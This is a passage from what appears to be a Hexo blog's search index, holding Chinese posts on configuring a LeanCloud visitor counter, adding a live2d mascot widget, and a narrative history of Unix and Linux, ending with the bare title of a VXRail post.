安全</li></ol><p>此时的 AppID 以及 AppKey 是暴露在外的，为了保证自己的博客安全，建议开启 leancloud 的”Web安全选项”。在 “设置” –&gt; “安全中心” –&gt; “Web 安全域名” 中添加自己的域名。</p><p><img src="https://i.loli.net/2019/08/31/5lpD82eiv6OHInb.png" alt="LC-6.png"></p><ol start="3"><li>最后 “Leancloud访客统计插件” 存在漏洞。</li></ol><p>当你上传配置并登录网页后，文章下面标题会出现如下报错：</p><pre class="line-numbers language-yml"><code class="language-yml">Error： 阅读次数：Counter not initialized! See more at console err msg.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>解决方法</li></ul><ol><li>将 “security” 选项设为 “false”。修改后的内容如下：</li></ol><pre class="line-numbers language-yml"><code class="language-yml">leancloud_visitors:  enable: true  app_id: &lt;<your app_id="">&gt;  app_key: &lt;<your app_key="">&gt;  # Dependencies: https://github.com/theme-next/hexo-leancloud-counter-security  # If you don't care about security in leancloud counter and just want to use it directly  # (without hexo-leancloud-counter-security plugin), set `security` to `false`.  security: false  betterPerformance: false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></your></your></code></pre><ol start="2"><li><p>根据大神的博客，手动修复漏洞。</p><p> <a href="https://leaferx.online/2018/02/11/lc-security/#5acc7b329f54542bb2384a7e" target="_blank" rel="noopener">Leancloud访客统计插件重大安全漏洞修复指南</a></p></li></ol><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://yfzhou.coding.me/2018/08/08/Hexo-Next%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E6%B7%BB%E5%8A%A0%E7%BB%9F%E8%AE%A1%E8%AE%BF%E5%AE%A2%E9%87%8F%E4%BB%A5%E5%8F%8A%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%EF%BC%89/" target="_blank" rel="noopener">Hexo-Next搭建个人博客（添加统计访客量以及文章阅读量）</a></p><p><a href="https://leaferx.online/2018/02/11/lc-security/#5acc7b329f54542bb2384a7e" target="_blank" rel="noopener">Leancloud访客统计插件重大安全漏洞修复指南</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> theme-next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo中添加lived看板娘</title>
      <link href="/2019/08/31/hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0lived%E7%9C%8B%E6%9D%BF%E5%A8%98/"/>
      <url>/2019/08/31/hexo%E4%B8%AD%E6%B7%BB%E5%8A%A0lived%E7%9C%8B%E6%9D%BF%E5%A8%98/</url>
      
        <content type="html"><![CDATA[<h2 id="小白水平"><a href="#小白水平" class="headerlink" title="小白水平"></a>小白水平</h2><ol><li>安装 live2d 模块</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> --save hexo-helper-live2d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><p>在 hexo 根目录下创建 “ live2d_models “ 目录</p></li><li><p>克隆 Live2dDemo 项目</p></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/summerscar/live2dDemo.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li><p>将 “ /live2dDemo/assets/ “ 目录下的所有内容复制到 “ live2d_models “ 中</p></li><li><p>在根目录下的 “ _config.yml “ 文件最后添加如下内容：</p></li></ol><pre class="line-numbers language-yml"><code class="language-yml">live2d:  enable: true  scriptFrom: local  pluginRootPath: live2dw/  pluginJsPath: lib/  pluginModelPath: assets/  tagMode: false  debug: false  model:    use: poi    # live2d_models 下的目录名  display:    position: right # 模型放置位置    width: 150  # 模型的宽    height: 300 # 模型的高  mobile:    show: true  react:    opacity: 0.7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：在 <a href="https://github.com/summerscar/live2dDemo">https://github.com/summerscar/live2dDemo</a> 中可以查看自己喜欢的看板娘，并在 model.use 中应用相应目录名。</p><h3 id="大神水平"><a href="#大神水平" class="headerlink" title="大神水平"></a>大神水平</h3><ol><li>在根目录 “ .deploy_git/index.html “ 的&lt;head&gt;&lt;/head&gt;标签中添加如下内容：</li></ol><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--live2d--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token comment" spellcheck="true">&lt;!--live2d--&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>克隆 live2d-widget</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/stevenjoezhang/live2d-widget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><p>将 “live2d-widget” 目录放到 “themes/主题/source” 下</p></li><li><p>修改 “live2d-widget” 目录下的 “autoload.js”</p></li></ol><p>将</p><pre class="line-numbers language-yml"><code class="language-yml">const live2d_path = "https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改为</p><pre class="line-numbers language-yml"><code class="language-yml">const live2d_path = "/live2d-widget/";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>在 “/themes/主题/layout/_layout.swing” 或 “/themes/主题/layout/layout.ejs” 添加如下内容：</li></ol><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/live2d-widget/autoload.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="6"><li>在 “ /themes/主题/_config.yml “ 中，添加如下内容：</li></ol><pre class="line-numbers language-yml"><code class="language-yml">live2d:  enable: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注：这里配置完成后，要把 根目录下的 “ _config.yml “ live2d 关掉</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/dataiyangu/article/details/83021854" target="_blank" rel="noopener">hexo中next主题添加里lived看板娘（会说话，会换装)</a></p><p><a href="https://www.jianshu.com/p/89440678ee3c" target="_blank" rel="noopener">Hexo博客NexT主题美化之新增看板娘(能说话、能换装)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> theme-next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux简介</title>
      <link href="/2019/08/29/linux%E7%AE%80%E4%BB%8B/"/>
      <url>/2019/08/29/linux%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="linux简介"><a href="#linux简介" class="headerlink" title="linux简介"></a>linux简介</h2><p>Linux 是一套免费使用和自由传播的类 Unix 操作系统。因为 linux 是借鉴 Unix 来开发的，与 unix 有许多相似之处，并且在一定程度上遵守 POSIX 规范。</p><h2 id="Unix-起源"><a href="#Unix-起源" class="headerlink" title="Unix 起源"></a>Unix 起源</h2><ul><li>MULTICS 项目</li></ul><p>回顾 Unix 历史，我们就要说一下一个叫 MULTICS 的项目。上世纪六十年代时，大部份计算机都是采用批处理的方式（也就是说，当作业积累一定数量的时候，计算机才会进行处理）。那时，我们熟知的美国电话及电报公司（AT&amp;T）、通用电器公司（G.E.）及麻省理工学院（MIT）计划合作开发一个多用途、分时及多用户的操作系统，也就是这个 MULTICS，其被设计运行在 GE-645 大型主机上。不过，这个项目由于太过复杂，整个目标过于庞大，糅合了太多的特性，进展太慢，几年下来都没有任何成果，而且性能都很低。于是到了 1969 年 2 月，贝尔实验室决定退出这个项目。</p><ul><li>Space Travel</li></ul><p>熟悉这段历史的人都知道，贝尔实验室中的有个叫 Ken Thompson 的人，他为 MULTICS 这个操作系统写了个游戏叫 “Space Travel” 的游戏，在 MULTICS 上经过实际运行后，他发现游戏速度很慢而且耗费昂贵 —— 每次运行会花费 75 美元。退出这个项目以后。他为了让这个游戏能玩，所以他找来 Dennis Ritchie 为这个游戏开发一个极其简单的操作系统。这就是后来的 Unix。（值得一提的是，当时他们本想在 DEC-10 上写，后来没有申请到，只好在实验室的土·啬角边找了一台被人遗弃的 Digital PDP-7 的迷你计算机进行他们的计划，这台计算机上连个操作系统都没有，于是他们用汇编语言仅一个月的时间就开发了一个操作系统的原型）他们的同事 Brian Kernighan 非常不喜欢这个系统，嘲笑 Ken Thompson 说：“你写的系统好真差劲，干脆叫 Unics 算了。” Unics 的名字就是相对于 MULTICS 的一种戏称，后业改成了 Unix。于是，Unix 就在这样被游戏和玩笑创造了，当时是1969年8 月。也就是这一年，Linux 之父 Linus Torvalds 在芬兰出生了。</p><ul><li>Unix 第一版出现</li></ul><p>1971年，Ken Thompson 写了充分长篇的申请报告，申请到了一台 PDP-11/24 的机器。于是 Unix 第一版出来了。在一台 PDP-11/24 的机器上完成。这台电脑只有 24KB 的物理内存和 500K 磁盘空间。Unix 占用了 12KB 的内存，剩下的一半内存可以支持两用户进行 Space Travel 的游戏。而著名的 fork() 系统调用也就是在这时出现的。</p><ul><li>C 语言出现</li></ul><p>到了 1973 年的时候，Ken Thompson 与 Dennis Ritchie 感到用汇编语言做移植太过于头痛，他们想用高级语言来完成第三版，对于当时完全以汇编语言来开发程序的年代，他们的想法算是相当的疯狂。一开始他们想尝试用 Fortran，可是失败了。后来他们用一个叫 BCPL 的语言开发，他们整合了BCPL 形成 B 语言，后来 Dennis Ritchie 觉得 B 语言还是不能满足要求，就是就改良了 B 语言，这就是今天的大名鼎鼎的 C 语言。于是，Ken Thompson 与 Dennis Ritchie 成功地用 C 语言重写了 Unix 的第三版内核。至此，Unix 这个操作系统修改、移植相当便利，为 Unix 日后的普及打下了坚实的基础。而 Unix 和 C 完美地结合成为一个统一体，C 与 Unix 很快成为世界的主导。</p><ul><li>Unix 发布</li></ul><p>Unix 的第一篇文章 “The UNIX Time Sharing System” 由 Ken Thompson 和 Dennis Ritchie 于1974年7月的 the Communications of the ACM 发表。这是 UNIX 与外界的首次接触。结果引起了学术界的广泛兴趣并对其源码索取，所以，Unix 第五版就以“仅用于教育目的”的协议，提供给各大学作为教学之用，成为当时操作系统课程中的范例教材。各大学公司开始通过 Unix 源码对 Unix 进行了各种各样的改进和扩展。于是，Unix 开始广泛流行。</p><h3 id="Unix-分裂"><a href="#Unix-分裂" class="headerlink" title="Unix 分裂"></a>Unix 分裂</h3><ul><li>BSD 出现</li></ul><p>1978年，对 Unix 而言是革命性的一年；因为学术界的老大柏克利大学，推出了一份以第六版为基础，加上一些改进和新功能而成的 Unix。这就是著名的 “1 BSD（1st Berkeley Software Distribution）”，开创了 Unix 的另一个分支：BSD 系列。 同时期，AT&amp;T 成立 USG，将 Unix 变成商业化的产品。从此，BSD 的 Unix 便和 AT&amp;T 的 Unix 分庭抗礼，Unix 就分为 System IV 和 4.x BSD 这两大主流，各自蓬勃发展。</p><ul><li>“最后一个真正的Unix”</li></ul><p>1979 年发布的 Unix 第七版被称为是“最后一个真正的 Unix”，这个版本的 Unix 内核只有 40K bytes。后来这个版本被移植到 VAX 机上。20世纪80年代相继发布的 8、9、10 版本只授权给了少数大学。</p><ul><li>TCP/IP</li></ul><p>1982 年，AT&amp;T 基于版本 7 开发了 UNIX System Ⅲ 的第一个版本，这是一个商业版本仅供出售。为了解决混乱的 UNIX 版本情况，AT&amp;T 综合了其他大学和公司开发的各种 UNIX，开发了 UNIX System V Release 1。这个新的 UNIX 商业发布版本不再包含源代码，所以加州大学 Berkeley 分校继续开发 BSD UNIX，作为 UNIX System III 和 V 的替代选择。BSD 对 UNIX 最重要的贡献之一是 TCP/IP。BSD 有 8 个主要的发行版中包含了 TCP/IP：4.1c、4.2、4.3、4.3-Tahoe、4.3-Reno、Net2、4.4以及 4.4-lite。这些发布版中的 TCP/IP 代码几乎是现在所有系统中 TCP/IP 实现的前辈，包括 AT&amp;T System V UNIX 和 Microsoft Windows中 的 TCP/IP 都参照了 BSD 的源码。</p><ul><li>sun</li></ul><p>同时，其他一些公司也开始为其自己的小型机或工作站提供商业版本的 UNIX 系统，有些选择 System V 作为基础版本，有些则选择了 BSD。BSD 的一名主要开发者，Bill Joy，在 BSD 基础上开发了 SunOS，并最终创办了 Sun Microsystems。</p><ul><li>386BSD</li></ul><p>1991年，一群 BSD开发者（Donn Seeley、Mike Karels、Bill Jolitz 和 Trent Hein）离开了加州大学，创办了 Berkeley Software Design， Inc （BSDI）。BSDI 是第一家在便宜常见的 Intel 平台上提供全功能商业 BSD UNIX 的厂商。后来 Bill Jolitz 离开了 BSDI，开始了 386BSD 的工作。386BSD 被认为是 FreeBSD、OpenBSD 和 NetBSD、DragonFlyBSD 的先辈。</p><ul><li>POSIX 标准</li></ul><p>这是一个 AT&amp;T 妄图私有化的 Unix 的时代。为了私有化 Unix，1986 年 IEEE 指定了一个委员会制定了一个一个开放作业系统的标准，称为 POSIX （Portable Operating Systems Interface）。最后加上个 X，不知道是为了好听，还是因为这本质上是 UNIX 的标准。当然，AT&amp;T 的 Unix 取得了这个标准制订战争的胜利，还取得了 Unix 这个注册商标。此时 BSD 的拥护者自喻为冷酷无情的公司帝国的反抗军。就销售量来说，AT&amp;T UNIX 始终赶不上 BSD/Sun。到 1990 年，AT&amp;T 与 BSD 版本已难明显区分，因为彼此都有采用对方的新发明。</p><p>这段时期，从实验室出来的被全世界所分享的 Unix，正处于被私有化的关键时期。</p><ul><li>Unix 的法律纠纷</li></ul><p>BSDI 很快就与 AT&amp;T 的 UNIX Systems Laboratories（USL）附属公司产生了法律纠纷，USL 是 AT&amp;T 注册的公司。AT&amp;T 为了拥有 System V 版权，以及 Unix 商标，为了垄断 Unix，1992年，USL 正式对 BSDI 提起诉讼，说 BSD 剽窃他的源码。而最终了结了好评如潮的 BSD 系统。</p><p>由于最后判决悬而未决，这桩法律诉讼将 BSD 后裔的开发，特别是自由软件，延迟了两年，这导致没有法律问题的 Linux 内核获得了极大的支持。Linux 跟 386BSD 的开发几乎同时起步，Linus 说，当时如果有自由的基于 386 的 Unix-like 操作系统，他就可能不会创造 Linux。尽管无法预料这给以后的软件业究竟造成了什么样的影响（如果没有这个法律纠纷，很有可能没有今天的革命性的 Linux），但有一点可以肯定，Linux 更加丰富了这块土壤。</p><p>这场官司一直打到  AT&amp;T 将自己的 Unix 系统实验室卖掉，新接手的 Novell 公司采取了一种比较开明的做法，允许 BSDI 自由发布自己的 BSD，但是前提是必须将来自于 AT&amp;T 的代码完全删除，于是诞生了 4。4 BSD Lite 版，由于这个版本不存在法律问题，4。4BSD Lite 成为了现代 BSD 系统的基础版本。</p><p>这桩诉讼最终在1994年1月了结，更多地满足了 BSDI 的利益。伯克利套件的 18，000 个文件中，只有 3 个文件要求删除，另有 70 个文件要求修改，并显示 USL 的版权说明。这项调解另外要求，USL 不得对 4。4BSD 提起诉讼，不管是用户还是 BSDI 代码的分发者。于是，BSD Unix 走上了复兴的道路。BSD 的开发也走向了几个不同的方向，并最终导致了 FreeBSD、OpenBSD 和 NetBSD 的出现。</p><p>从 AT&amp;T 意识到了 Unix 的商业价值，不再将 Unix 源码授权给学术机构以来，到以后的几十年，Unix 仍在不断变化，其版权所有者不断变更，授权者的数量也在增加。Unix 的版权曾经为 AT&amp;T 所有，之后 Novell 拥有了 Unix，再之后 Novell 又将版权出售给了 SCO（这一事实双方尚存在争议，这里是最新进展）。有很多大公司在取得了 Unix 的授权之后，开发了自己的 Unix 产品。（几年前，据传闻微软为了限制 Linux，微软让 SCO 到法院告Linux 剽窃其源码）</p><p>由于 Unix 是由 C 语言写的，所以修改和移植都很容易，因此，很多商业公司及学术机构均加入这个操作系统的研发，各个不同版本的 Unix 也开始蓬勃发展。这才产生了今天这么多的各式各样的 Unix 衍生产品。如 AIX、Solaris、HP-UX、IRIX、OSF、Ultrix 等等。（这些商业化的 Unix 基本上都是源于 AT&amp;T 授权的 Unix System V）</p><h3 id="Unix-开源组织"><a href="#Unix-开源组织" class="headerlink" title="Unix 开源组织"></a>Unix 开源组织</h3><p>AT&amp;T 的这种商业态度，让当时许许多的 Unix 的爱好者和软件开发者们感到相当的痛心和忧虑，他们认为商业化的种种限制并不利于产生的发展，相反还能导制产品出现诸多的问题。随着商业化 Unix 的版本的种种限制和诸多问题，引起了大众的不满和反对。于是，大家开始有组织地结成“反叛联盟”以此对抗欺行罢市的 AT&amp;T 等商业化行为。<br>另一方面，关于“大教堂”（集权、封闭、受控、保密）和“集市”（分权、公开、精细的同僚复审）两种开发模式的对比成为了新思潮的中心思想。这个新思潮对 IT 业产生了非常深远影响。为整个计算机世界带来了革命性的价值观。</p><ul><li>Open Source</li></ul><p>此时，一个名叫 Richard Stallman 的领袖出现了，他认为 Unix 是一个相当好的操作系统，如果大家都能够将自己所学贡献出来，那么这个系统将会更加的优异！他倡导的 Open Source 的概念，就是针对 Unix 这一事实反对实验室里的产品商业化私有化。尽管 Stallman 既不是、也从来没有成为一个 Unix 程序员，但在后 1980 的大环境下，实现一个仿 Unix 操作系统成了他追求的明确战略目标。Richard Stallman 早期的捐助者大都是新踏入 Unix 土地的老牌 ARPANET 黑客，他们对代码共享的使命感甚至比那些有更多 Unix 背景的人强烈。</p><ul><li>GNU</li></ul><p>为了这个理想，Richard Stallman 于 1984 年创业了 GNU，计划开发一套与 Unix 相互兼容的的软件。1985 年 Richard Stallman 又创立了自由软件基金会（Free Software Foundation）来为 GNU 计划提供技术、法律以及财政支持。尽管 GNU 计划大部分时候是由个人自愿无偿贡献，但 FSF 有时还是会聘请程序员帮助编写。当 GNU 计划开始逐渐获得成功时，一些商业公司开始介入开发和技术支持。当中最著名的就是之后被 Red Hat 兼并的 Cygnus Solutions。</p><p>GNU 组织的建立，延续了当年 Unix 刚出现时的情形，并为这种情形建立了可靠的法律和财务保障。GNU 工程十几年以来， 已经成为一个对软件开发主要的影响力量， 创造了无数的重要的工具。例如：强健的编译器，有力的文本编辑器，甚至一个全功能的操作系统。从那时开始，许多程序员聚集起来开始开发一个自由的、高质量、易理解的软件，让这使得 Unix 社区生机勃勃，一派繁荣景象。</p><p>自90年代发起这个计划以来，GNU 开始大量的产生或收集各种系统所必备的组件，像是——函数库、编译器、调式工具、文本编辑器、网站服务器，以及一个 Unix 的使用者接口（Unix shell）等等，等等。但由于种种原因，GNU 一直没有开发操作系统的 kernel。正当 Richard Stallman在为操作系统内核伤脑筋的时候，Linux 出现了。</p><h2 id="Linux-横空出世"><a href="#Linux-横空出世" class="headerlink" title="Linux 横空出世"></a>Linux 横空出世</h2><p>1990年，Linus Torvalds 还是芬兰赫尔辛基大学的一名学生，最初是用汇编语言写了一个在 80386 保护模式下处理多任务切换的程序，后来从 Minix 得到灵感，进一步产生了自认为狂妄的想法——写一个比 Minix 更好的 Minix，于是开始写了一些硬件的设备驱动程序，一个小的文件系统。这样0.0.1版本的 Linux 就出来了，但是它只具有操作系统内核的勉强的雏形，甚至不能运行，你必须在有 Minix 的机器上编译以后才能玩。这时候 Linus 已经完全着迷而不想停止，决定踢开 Minix，于是在1991年10 月5号发布 Linux 0.0.2 版本，在这个版本中已经可以运行 bash 和 gcc。</p><ul><li>Linux 1.0</li></ul><p>从一开始，Linus 就决定自由扩散 Linux，包括原代码，随即 Linux 引起黑客们的注意，通过计算机网络加入了 Linux 的内核开发。Linux 倾向于成为一个黑客的系统——直到今天，在 Linux 社区里内核的开发被认为是真正的编程。由于一批高水平黑客的加入，使 Linux 发展迅猛，几乎一两个礼拜就有新版或修正版的出现，到1993年底94年初，Linux 1.0 终于诞生了！</p><p>Linux 1.0 已经是一个功能完备的操作系统，而且内核写得紧凑高效，可以充分发挥硬件的性能，在 4M 内存的 80386 机器上也表现得非常好，至今人们还在津津乐道。时至今日，kernel 的版本已经出到 2.6。Linux 的发展不像传统的软件工程，它完全是透过网络，集合世界各地的高手而成的一套操作系统，在这里我们也可以见识到网络快速传播的威力。Linux 初次让整个世界感觉到了开源力量和网络力量的如此强大。（Linux 的标志和吉祥物是一只名字叫做 Tux 的企鹅，标志的由来是因为Linus在澳洲时曾被一只动物园里的企鹅咬了一口，便选择了企鹅作为Linux的标志。）</p><ul><li>Red Hat</li></ul><p>Linux 的历史是和 GNU 紧密联系在一起的。从1983年开始的 GNU 计划致力于开发一个自由并且完整的类 Unix 操作系统，包括软件开发工具和各种应用程序。到 1991年 Linux 内核发布的时候，GNU 已经几乎完成了除了系统内核之外的各种必备软件的开发。在 Linus Torvalds 和其它开发人员的努力下，GNU 组件可以运行于 Linux 内核之上。整个内核是基于 GNU 通用公共许可，也就是 GPL（GNU General Public License，GNU通用公共许可证）的，但是 Linux 内核并不是 GNU 计划的一部分。1994年3月，Linux1.0 版正式发布，Marc Ewing 成立了 Red Hat 软件公司，成为最著名的 Linux 分销商之一。</p><p>严格来讲，Linux 这个词本身只表示 Linux 内核，但在实际上人们已经习惯了用 Linux 来形容整个基于 Linux 内核，并且使用 GNU 工程各种工具和应用程序的操作系统（也被称为 GNU/Linux）。基于这些组件的 Linux 软件被称为 Linux 发行版。一般来讲，一个 Linux 发行套件包含大量的软件，比如软件开发工具，数据库，Web 服务器（例如 Apache），X Window，桌面环境（比如 GNOME 和 KDE），办公套件（比如 OpenOffice.org），等等。</p><p>1991 至 1995 年间，Linux 从概念型的 0.1 版本内核原型，发展成为能够在性能和特性上均堪媲美专有 Unix 的操作系统，并且在连续正常工作时间等重要统计数据上打败了这些 Unix 中的绝大部分。1995 年，Linux 找到了自己的杀手级应用——开源的 web 服务器 Apache。就像 Linux，Apache 出众地稳定和高效。很快，运行 Apache 的 Linux 机器成了全球 ISP 平台的首选。约 60% 的网站选用 Apache，轻松击败了另两个主要的专有型竞争对手。今天的 LAMP（Linux ， Apache， MySQL， PHP）已经成为了架构 Web 服务器的主要首选。<br>现如今的 Linux 不但可以装在几乎所有的主流服务器上，当然也包括桌面的 X86 系统中。其还常常被用于嵌入式系统，机顶盒、手机、交换机、游戏机、PDA、网络交换机、路由器、等等，都是因为 Linux 那精彩的内核。</p><p>Linux 的出现，不仅仅给世界带来了一个免费的操作系统，也不仅仅是对 Unix 自由、共享的文化的延续，它的出现带给了计算机世界自 Unix、GNU 以来更为成熟的思想和文化。</p><h3 id="Linux-——-今天的领袖"><a href="#Linux-——-今天的领袖" class="headerlink" title="Linux —— 今天的领袖"></a>Linux —— 今天的领袖</h3><p>Linux 和 GNU 关系是比较微妙的。那时，自由软件基金会编写的用户软件工具包铺平了一条摆脱高成本专有软件开发工具的前进道路。意识服从经济，而不是领导：一些新手加入了 RMS 的革命运动，高举 GPL 大旗，另一些人则更认同整体意义上的 Unix 传统，加入了反对 GPL 的阵营，但其他大部分人置身事外，一心编码。</p><p>今天，我们也说不清楚是 GNU Linux 还是 Linux GNU。Linux 既不排斥开源，也不排斥商业化，Linus 认为好的软件是需要免费和商业化共同推进的。正是这种革命性的想法，造就了今天的 Linux 火红的局面。Linux 就像一股清泉流入了所有人的心中，引发了很多的启迪和思考。</p><h3 id="Unix-的历史教训"><a href="#Unix-的历史教训" class="headerlink" title="Unix 的历史教训"></a>Unix 的历史教训</h3><p>在 Unix 历史中，最大的规律就是：<br>距开源越近就越繁荣。任何将 Unix 专有化的企图，只能陷入停滞和衰败。<br>回顾过去，我们早该认识到这一点。1984年至今，我们浪费了十年时间才学到这个教训。如果我们日后不思悔改，可能还得大吃苦头。</p><p>虽然我们在软件设计这个重要但狭窄的领域比其他人聪明，但这不能使我们摆脱对技术与经济相互作用影响的茫然，而这些就发生在我们的眼皮底下。即使 Unix 社区中最具洞察力、最具远见卓识的思想家，他们的眼光终究有限。对今后的教训就是：过度依赖任何一种技术或者商业模式都是错误的——相反，保持软件及其设计传统的的灵活性才是长存之道。</p><p>另一个教训是：别和低价而灵活的方案较劲。或者，换句话说，低档的硬件只要数量足够，就能爬上性能曲线而最终获胜。经济学家 Clayton Christensen 称之为“破坏性技术”，他在《创新者窘境》一书中以磁盘驱动器、蒸汽挖土机和摩托车为例阐明了这种现象的发生。当小型机取代大型机、工作站和服务器取代小型机以及日用 Intel 机器又取代工作站和服务器时，我们也看到了这种现象。开源运动获得成功正是由于软件的大众化。Unix 要繁荣，就必须继续采用吸纳低价而灵活的方案的诀窍，而不是去反对它们。</p><p>最后，旧学派的 Unix 社区因采用了传统的公司组织、财务和市场等命令机制而最终未能实现“职业化”。只有痴迷的“黑客”和具有创造力的怪人结成的反叛联盟才能把我们从愚蠢中拯救出来——他们接着教导我们，真正的专业和奉献精神，正是我们在屈服于世俗观念的“合理商业做法”之前的所作所为。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在中国，我们被微软所创造的文化所笼罩里。就在 Unix 出现革命性的转变，在 Unix 影响计算机世界文化的那几年里，科班出生专业开发人员学习的是 MS-DOS 和微软的文化，我们犹如一个井底之蛙一样，对外面的番·习天覆地的变化无动于衷。微软创造的文化在我们这里尤其地根深蒂固，我们几乎忘记了另外一边的 Unix 。</p><p>在那充满激情的 Unix 的岁月里，大伙为了科研目的或个人兴趣在 Unix 上进行各种开发，并且不计较金钱利益，将这些源码公开，互相共享。在那里，开发和自由成为主题，正因为如此，当今的世界才如此丰富多采。在 40 年 Unix 文化和技术积淀的里面，蕴涵着比较纯正的计算机文化和思想。</p><p>纵观整个 Unix 的历史过程中，许许多多的程序员、工程师前辈们在 Unix 中所摸爬滚打，他们的辛勤地、他们呕心沥血地跟随 Unix，努力建立一个繁荣的计算机世界的文明。Unix 不是一个简简单单的操作系统。有人说，Unix 是程序员设计给程序员的，一点没错。Unix 的近40年历史造就了它的博大精深，它给程序员们带来的绝不仅仅只是技术上的知识。它的失误，它的无奈，它的精神，它的荣耀，它从技术和思想上都启迪着我们。对于程序员来说，学习 Unix 就等同于向前辈程序学习。无论你是什么样的程序员，你都应该了解 Unix，这是开发人员的根，前面的开发者造就了它，而它又在引领后面的开发人员，它是前辈程序员们交给我们的一份礼物，一个接力棒，它是开发人员赖以生存的土壤，是上一辈程序员留给我们这一代程序员开启未来的钥匙。Unix 就像一个程序员教父一样，理当受到我们的尊敬和崇拜。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://blog.csdn.net/haoel/article/details/1542340" target="_blank" rel="noopener">Unix传奇（上篇）</a></p><p><a href="https://blog.csdn.net/iteye_3952/article/details/81440521" target="_blank" rel="noopener">Unix传奇（下篇）</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> unix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VXRail清除假警报</title>
      <link href="/2019/08/27/VXRail%E6%B8%85%E9%99%A4%E5%81%87%E6%8A%A5%E8%AD%A6/"/>
      <url>/2019/08/27/VXRail%E6%B8%85%E9%99%A4%E5%81%87%E6%8A%A5%E8%AD%A6/</url>
      
